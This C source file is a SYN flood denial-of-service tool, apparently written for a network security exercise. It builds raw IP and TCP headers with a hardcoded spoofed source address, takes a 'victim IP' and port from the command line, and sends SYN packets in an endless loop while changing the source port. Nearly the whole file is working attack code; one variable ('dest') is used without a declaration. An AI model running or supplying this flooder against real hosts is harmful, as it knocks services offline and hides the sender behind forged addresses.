#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <errno.h>
#include "header.h"

#define SRC_IP  "192.30.50.125" 




// inspired from https://www.binarytides.com/syn-flood-dos-attack/

int main(int argc, char *argv[]){

     if (argc < 3) {
	fprintf(stderr, "Missing argument. Please enter the victim IP and a port number\n");
	return 1;
    }
	
	char source_ip[] = SRC_IP;
	char*  dest_ip = argv[1];
	short SRC_PORT=1000;
	short port_number=80;
  

    if (sscanf(argv[2], "%hd", &port_number) != 1) {
			printf("Enter a valid port number please \n");
            return -5;
		}

	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	printf("fd est %d \n", fd);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
	printf("fd est %d \n", fd);
	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

    char packet[65536];
	memset(packet, 0, 65536);

    //IP header pointer
	struct iphdr *iph = (struct iphdr *)packet;

	//TCP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
	struct pseudo_header psh; //pseudo header

	//fill the IP header here
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr); 
	iph->id=htonl(16670); // I chose an ID randomly using the logfile of the previous exercise
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol =IPPROTO_TCP;
	iph->check=checksum((unsigned short *)packet, iph->tot_len);
	iph->saddr = inet_addr ( source_ip );	
	iph->daddr =  inet_addr (dest_ip);


	//fill the TCP header



	tcph->source = htons (SRC_PORT);
	tcph->dest = htons (port_number);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;		/* first and only tcp segment */
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (5840);	/* maximum allowed window size */
	tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
	tcph->urg_ptr = 0;



	psh.source_address = inet_addr( source_ip );
	psh.dest_address = inet_addr( dest_ip );
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);
	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

	tcph->check=checksum((unsigned short*) &psh , sizeof (struct pseudo_header));

	// set the destination
	
	memset(&dest, 0, sizeof(dest));
	dest.sin_family = AF_INET;
   // inet_aton(dest_ip, &dest.sin_addr);
    dest.sin_addr.s_addr = inet_addr (dest_ip);
	dest.sin_port = htons(port_number);

	int sent;
	//int i=0;
	
	while (1){
		tcph->source = htons ((SRC_PORT++)%32766);
		sent=sendto(fd, packet, iph->tot_len , MSG_CONFIRM, (struct sockaddr*) &dest,  sizeof(dest));
		
		if (sent<0)
		{
        	fprintf(stderr, "Could not send: %s\n", strerror(errno));
    	} 
		
		else
		{
			printf ("our packet is sent and here is its length: %d \n" , iph->tot_len);
		}
		
	}
	

    return 0 ;
}
